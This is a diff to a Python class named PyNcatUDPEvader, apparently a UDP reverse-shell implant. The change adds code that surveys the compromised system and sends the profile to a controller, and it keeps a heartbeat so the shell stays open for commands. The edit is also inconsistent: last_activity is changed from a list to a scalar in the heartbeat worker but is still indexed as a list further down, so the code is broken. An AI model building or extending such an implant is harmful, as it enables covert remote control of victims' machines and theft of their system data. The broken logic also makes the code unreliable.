@@ -410,20 +410,27 @@ class PyNcatUDPEvader:
                         while heartbeat_running.is_set():
                             try:
                                 current_time = time.time()
-                                if current_time - last_activity[0] >= self.args.heartbeat:
+                                if current_time - last_activity >= self.args.heartbeat:
                                     send_packet(b"__PING__")
-                                    last_activity[0] = current_time
+                                    last_activity = current_time
                                 self._apply_sleep(self.args.heartbeat * 0.25)
                             except Exception:
                                 break
 
                     threading.Thread(target=heartbeat_worker, daemon=True).start()
                     
-                    # Initial beacon signal
-                    send_packet(b"[+] Reverse Shell Node Active. Send commands.")
+                    # --- UPGRADED CONTEXT SIGNATURE BEACON HERE ---
+                    # Instead of a static alert message, compile the entire system configuration envelope
+                    logging.info("[*] Compiling automated configuration envelope...")
+                    discovery_payload = self.run_system_survey()
+                    
+                    # Ship the system profile off immediately to register with the controller listener
+                    send_packet(discovery_payload)
+                    # -----------------------------------------------
                     
                     try:
                         while True:
+
                             try:
                                 raw_packet, addr = client.recvfrom(65507)
                                 last_activity[0] = time.time()
